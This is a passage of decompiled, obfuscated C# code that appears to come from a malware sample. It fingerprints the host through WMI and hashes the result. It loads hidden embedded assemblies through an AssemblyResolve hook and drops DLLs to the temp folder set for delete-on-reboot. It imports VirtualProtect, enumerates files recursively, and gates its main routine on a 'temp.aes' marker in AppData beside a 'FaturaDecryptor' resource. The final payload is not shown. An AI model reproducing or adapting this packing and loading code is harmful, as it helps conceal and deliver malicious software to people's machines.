		return string.Format("{0}{1}", BitConverter.ToUInt32(byte_, 4).ToString("X8"), BitConverter.ToUInt32(byte_, 0).ToString("X8"));
	}

	static void smethod_52(Class15.Class17 class17_0)
	{
		class17_0.uint_0 >>= class17_0.int_2 & 7;
		class17_0.int_2 &= -8;
	}

	static void smethod_53(AppDomain appDomain_0)
	{
		appDomain_0.AssemblyResolve += Class22.smethod_57;
	}

	static string smethod_54()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		string text = "";
		ManagementObjectCollection obj = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get();
		bool flag = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
		ManagementObjectEnumerator enumerator = obj.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val).get_Properties().get_Item("Caption").get_Value()
					.ToString() + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432") + ((ManagementBaseObject)val).get_Properties().get_Item("Version").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		text.Replace(" ", "");
		text.Replace("Windows", "");
		text.Replace("windows", "");
		text += (flag ? ":64" : "=32");
		return BitConverter.ToString(MD5.Create().ComputeHash(Encoding.Default.GetBytes(text))).Replace("-", "");
	}

	static byte[] smethod_55(string string_0, Class0 class0_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool VirtualProtect([In] byte[] byte_0, IntPtr intptr_0, int int_0, out int int_1);

	static int smethod_56(Class15.Class17 class17_0)
	{
		return class17_0.int_2;
	}

	unsafe static Assembly smethod_57(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		void* ptr = stackalloc byte[16];
		Class9.Struct2 @struct = new Class9.Struct2(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezQ4MjkxZjcyLWI3NWMtNDFlOS04YmFkLTc2NzQ1YWQyODViYn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{b411dddf-4b8c-4832-b8aa-90fa4e9b6a06},ezQ4MjkxZjcyLWI3NWMtNDFlOS04YmFkLTc2NzQ1YWQyODViYn0=,[z]{b411dddf-4b8c-4832-b8aa-90fa4e9b6a06}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class9.dictionary_0)
			{
				if (Class9.dictionary_0.ContainsKey(text2))
				{
					return Class9.dictionary_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (flag)
					{
						array2 = Class22.smethod_16(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class22.MoveFileEx(text5, (string)null, 4);
								Class22.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class9.dictionary_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static string smethod_58(Class2 class2_0)
	{
		return class2_0.string_0;
	}

	static void Main(string[] args)
	{
		if (Class22.smethod_7())
		{
			Class22.smethod_31();
			if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes")))
			{
				Class1.smethod_0();
			}
		}
	}

	unsafe static int smethod_59(byte[] byte_0, int int_0, int int_1, Class15.Class16 class16_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class16_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class22.smethod_41(byte_0, int_0, class16_0.class18_0, int_1);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class22.smethod_60(class16_0) || (class16_0.class18_0.int_1 > 0 && class16_0.int_4 != 11));
		return *(int*)ptr;
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, out uint uint_1);

	unsafe static bool smethod_60(Class15.Class16 class16_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)((byte*)ptr + 4) = class16_0.int_4;
		switch (*(int*)((byte*)ptr + 4))
		{
		case 2:
			if (class16_0.bool_0)
			{
				class16_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class22.smethod_12(class16_0.class17_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class22.smethod_35(class16_0.class17_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class16_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class22.smethod_52(class16_0.class17_0);
				class16_0.int_4 = 3;
				break;
			case 1:
				class16_0.class19_0 = Class15.Class19.class19_0;
				class16_0.class19_1 = Class15.Class19.class19_1;
				class16_0.int_4 = 7;
				break;
			case 2:
				class16_0.class20_0 = new Class15.Class20();
				class16_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class16_0.int_8 = Class22.smethod_12(class16_0.class17_0, 16)) < 0)
			{
				return false;
			}
			Class22.smethod_35(class16_0.class17_0, 16);
			class16_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class22.smethod_12(class16_0.class17_0, 16) < 0)
			{
				return false;
			}
			Class22.smethod_35(class16_0.class17_0, 16);
			class16_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class22.smethod_42(class16_0.class18_0, class16_0.class17_0, class16_0.int_8);
			class16_0.int_8 -= *(int*)((byte*)ptr + 8);
			if (class16_0.int_8 == 0)
			{
				class16_0.int_4 = 2;
				return true;
			}
			return !Class22.smethod_64(class16_0.class17_0);
		case 6:
			if (!Class22.smethod_33(class16_0.class20_0, class16_0.class17_0))
			{
				return false;
			}
			class16_0.class19_0 = Class22.smethod_61(class16_0.class20_0);
			class16_0.class19_1 = Class22.smethod_14(class16_0.class20_0);
			class16_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class22.smethod_6(class16_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static Class15.Class19 smethod_61(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_3];
		Array.Copy(class20_0.byte_1, 0, array, 0, class20_0.int_3);
		return new Class15.Class19(array);
	}

	static List<string> smethod_62(string string_0, string string_1)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(string_0, string_1, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_2 in directories)
			{
				list.AddRange(Class22.smethod_62(string_2, string_1));
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	static void smethod_63(Class2 class2_0)
	{
		string text = Class22.smethod_9();
		string text2 = Class22.smethod_44();
		string text3 = Class22.smethod_24();
		class2_0.string_0 = text + text2;
		class2_0.string_1 = class2_0.string_0 + text3;
	}

	static bool smethod_64(Class15.Class17 class17_0)
	{
		return class17_0.int_0 == class17_0.int_1;
	}

	static byte[] smethod_65()
	{
		return (byte[])Class22.smethod_32().GetObject("FaturaDecryptor", Class6.cultureInfo_0);
	}
}
